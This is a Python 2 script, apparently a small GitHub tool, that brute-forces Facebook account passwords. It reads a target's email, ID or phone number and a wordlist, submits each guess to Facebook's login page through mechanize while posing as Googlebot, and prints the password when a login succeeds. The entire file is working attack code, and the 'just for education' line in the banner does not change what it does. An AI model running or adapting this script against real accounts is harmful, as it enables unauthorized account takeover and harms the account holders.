#!usr/bin/python
# -*- coding: utf-8 -*-
import sys
import random
import mechanize
import cookielib
import os

os.system("clear")
class bcolors:
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKBLUE = '\033[94m'

print bcolors.BOLD + ''
print '\t   # by djouamaa hocine   '
print '\t   # v1.0 15.09.2018 '
print '\t   # Github: /djouamaah'
print '\t   # this tool just for education '
print '\t   __ _     _                _        __                     '
print '\t  / _| |__ | |__  _ __ _   _| |_ ___ / _| ___  _ __ ___ ___  '
print '\t | |_| '_ \| '_ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '
print '\t |  _| |_) | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ '
print '\t |_| |_.__/|_.__/|_|   \__,_|\__\___|_|  \___/|_|  \___\___| '                                                      
print '' + bcolors.ENDC

email = str(raw_input("[?] User name | User ID | Email | Phone number :> "))
passwordlist = str(raw_input("[?] The name of the Wordlist file :> "))

useragents = [('User-agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')]

login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r [*] Tried password: %s " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)


     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log != login:
        print bcolors.OKGREEN + "\n\n\n [*] Password found!." + bcolors.ENDC
        print bcolors.WARNING + "\n [*] Password: %s\n" % (password) + bcolors.ENDC
        sys.exit(1)
  except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] exiting.. " + bcolors.ENDC
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] exiting.. " + bcolors.ENDC
        sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print bcolors.FAIL + "\n [!] Error: Wordlist file not found! \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] exiting..\n " + bcolors.ENDC
        sys.exit(1)
    try:
        print bcolors.OKBLUE + " [*] Account information : %s" % (email) + bcolors.ENDC
        print " [*] Number of passwords :" , len(passwords), "passwords"
        print " [*] Working on, Please wait .."
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] exiting..\n " + bcolors.ENDC
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print bcolors.FAIL + "\n[!] exiting..\n " + bcolors.ENDC
        sys.exit(1)

if __name__ == '__main__':
    check()
